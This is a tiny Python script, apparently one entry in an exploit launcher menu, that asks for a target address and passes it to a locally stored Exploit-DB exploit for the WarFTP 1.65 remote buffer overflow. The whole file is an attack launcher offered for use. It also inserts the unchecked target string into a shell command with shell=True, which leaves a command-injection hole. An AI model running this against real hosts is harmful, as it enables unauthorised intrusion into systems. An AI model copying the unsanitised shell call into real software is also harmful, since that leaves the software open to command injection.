import subprocess as sub


class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


target_address = input(f"{Colors.red}(WarFTP 1.65 Remote Buffer Overflow){Colors.end} [Enter Target]:~#")
sub.call(f"python /usr/share/exploitdb/exploits/windows/remote/3474.py {target_address}", shell=True)
